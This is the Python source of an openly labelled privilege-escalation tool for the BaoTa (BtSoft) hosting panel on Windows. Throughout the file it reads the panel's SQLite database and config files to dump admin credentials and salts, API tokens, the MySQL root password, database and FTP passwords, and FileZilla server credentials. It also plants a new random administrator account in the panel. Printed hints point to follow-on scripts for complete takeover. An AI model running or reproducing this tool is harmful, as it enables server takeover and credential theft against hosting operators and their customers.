# -*- coding:utf-8 -*-
import sqlite3


class BT:
    def __init__(self):
        self.conn = sqlite3.connect('C:/BtSoft/panel/data/default.db')
        self.c = self.conn.cursor()

    @staticmethod
    def read_file(path):
        with open(path, 'r') as file:
            return file.read()

    @staticmethod
    def get_random_string(length):
        from random import Random
        strings = ''
        chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
        char_len = len(chars) - 1
        random = Random()
        for i in range(length):
            strings += chars[random.randint(0, char_len)]
        return strings

    @staticmethod
    def md5(string):
        import hashlib
        return hashlib.md5(string.encode()).hexdigest()

    def hash_password(self, password, salt):
        return self.md5(self.md5(self.md5(password) + '_bt.cn') + salt)

    def get_panel_path(self):
        return self.read_file('C:/BtSoft/panel/data/admin_path.pl')

    def get_default_username(self):
        cursor = self.c.execute('select username from users where id=1')
        return cursor.fetchone()[0]

    def get_default_password(self):
        return self.read_file('C:/BtSoft/panel/data/default.pl')

    def get_all_user(self):
        cursor = self.c.execute('select username, password, salt from users')
        return cursor.fetchall()

    def get_api_information(self):
        import json
        api_data = json.loads(self.read_file('C:/BtSoft/panel/config/api.json'))
        if api_data['open']:
            token = api_data['token']
            limit_ip = api_data['limit_addr']
            return f'Token： {token}, 限制IP： {limit_ip}'
        else:
            return '未开启api'

    def get_mysql_root_password(self):
        cursor = self.c.execute('select mysql_root from config')
        return cursor.fetchone()[0]

    def insert_panel_user(self, username, password, salt):
        password = self.hash_password(password, salt)
        try:
            sql = f"INSERT INTO users (username,password,salt,email) VALUES ('{username}', '{password}', '{salt}', 'admin@qq.com')"
            self.c.execute(sql)
            self.conn.commit()
            return '写入成功！'
        except sqlite3.OperationalError:
            return '写入失败。'

    def get_database_users(self):
        cursor = self.c.execute('select name, username, password, type from databases')
        return cursor.fetchall()

    def get_ftp_users(self):
        cursor = self.c.execute('select name, password from ftps')
        return cursor.fetchall()

    def get_filezilla_interface(self):
        from xml.etree.ElementTree import fromstring
        ftp_xml = ''
        try:
            ftp_xml = self.read_file('C:/BtSoft/ftpServer/FileZilla Server Interface.xml')
            root = fromstring(ftp_xml)
            server = root.findall('./Settings/Item[@name="Last Server Address"]')[0].text
            port = root.findall('./Settings/Item[@name="Last Server Port"]')[0].text
            password = root.findall('./Settings/Item[@name="Last Server Password"]')[0].text
            return f'已安装！ 使用 https://github.com/Hzllaga/FileZilla_Privilege_Escalation\n{server}:{port} 密码： {password}'
        except FileNotFoundError:
            return '未安装Filezilla'


def banner():
    print('''  _____________________________________
/ BaoTa Panel Privilege escalation tool \\
\\ Author: https://github.com/Hzllaga    /
  -------------------------------------
         \\   ^__^ 
          \\  (oo)\\_______
             (__)\\       )\\/\\
                 ||----w |
                 ||     ||
    ''')


if __name__ == '__main__':
    banner()
    bt = BT()
    print('===========================================')
    print(f'登录位置： {bt.get_panel_path()}')
    print(f'默认账号： {bt.get_default_username()}')
    print(f'默认密码： {bt.get_default_password()}')
    print()
    salt = bt.get_random_string(12)
    username = bt.get_random_string(6)
    password = bt.get_random_string(10)
    print(f'尝试写入 账号:{username} 密码：{password} 的面板用户：')
    print(f'{bt.insert_panel_user(username, password, salt)}')
    print('===========================================')
    print('面板用户信息：')
    for user in bt.get_all_user():
        print(f'账号： {user[0]}, 密码： {user[1]}, 盐： {user[2]}')
    print('===========================================')
    print('面板API状态：')
    print(f'{bt.get_api_information()}')
    print('如果已开启且限制IP为服务器IP可以执行bt_panel_api.py直接秒！')
    print('===========================================')
    print(f'MySQL root密码： {bt.get_mysql_root_password()}')
    print('===========================================')
    print('数据库用户信息：')
    for db_user in bt.get_database_users():
        print(f'库名： {db_user[0]}, 用户： {db_user[1]}, 密码： {db_user[2]}, 类型： {db_user[3]}')
    print('===========================================')
    print('FTP用户信息：')
    for ftp_user in bt.get_ftp_users():
        print(f'用户： {ftp_user[0]}, 密码： {ftp_user[1]}')
    print('===========================================')
    print('Filezilla Interface配置信息：')
    print(f'{bt.get_filezilla_interface()}')
    print('如果已安装可以通过API或计划任务直接秒！')
    print('===========================================')
